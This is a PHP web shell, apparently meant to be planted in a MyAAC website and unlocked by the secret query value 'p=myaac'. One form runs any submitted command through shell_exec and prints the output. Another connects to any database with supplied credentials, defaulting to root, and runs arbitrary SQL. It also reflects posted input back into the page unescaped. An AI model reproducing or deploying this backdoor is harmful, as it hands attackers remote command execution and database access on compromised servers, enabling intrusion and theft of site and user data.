<?php if (!(isset($_GET['p']) && 'myaac' === $_GET['p'])) die('Direct access not allowed!'); ?>

<form method="post" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<fieldset>
<legend>Command</legend>
<input type="hidden" name="p" value="<?php echo $_GET['p']; ?>">
command:<br>
<textarea name="command" rows="3" cols="100" autofocus><?php echo isset($_POST['command']) ? $_POST['command'] : 'id'; ?></textarea><br>
<button type="submit">Run</button>
</fieldset>
</form>

<form method="post" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<fieldset>
<legend>SQL</legend>
<input type="hidden" name="p" value="<?php echo $_GET['p']; ?>">
dsn: <input type="text" size="50" name="dsn" value="<?php echo isset($_POST['dsn']) ? $_POST['dsn'] : 'mysql:host=127.0.0.1;dbname='; ?>"><br>
username: <input type="text" size="30" name="username" value="<?php echo isset($_POST['username']) ? $_POST['username'] : 'root'; ?>"><br>
password: <input type="text" size="30" name="password" value="<?php echo isset($_POST['password']) ? $_POST['password'] : ''; ?>"><br>
query:<br>
<textarea name="query" rows="3" cols="100"><?php echo isset($_POST['query']) ? $_POST['query'] : 'SELECT 1;'; ?></textarea><br>
<button type="submit">Run</button>
</fieldset>
</form>

<?php
  if (isset($_POST['command'])) {
    $stdout = shell_exec(sprintf('%s 2>&1', $_POST['command']));
    echo sprintf('<pre style="background:lightyellow;padding:24px;">%s</pre>', htmlspecialchars($stdout, ENT_QUOTES, 'UTF-8'));
    exit;
  }

  if (isset($_POST['dsn'], $_POST['username'], $_POST['password'], $_POST['query'])) {
    try {
      $dbh = new \PDO($_POST['dsn'], $_POST['username'], $_POST['password']);
      if (false === $stmt = $dbh->query($_POST['query'], PDO::FETCH_ASSOC))
        throw new \PDOException($dbh->errorInfo()[2], true);

      $result = var_export($stmt->fetchAll(), true);
    } catch (\Throwable $e) {
      $result = $e->getMessage();
    }

    echo sprintf('<pre style="background:lightyellow;padding:24px;">%s</pre>', htmlspecialchars($result, ENT_QUOTES, 'UTF-8'));
  }
?>

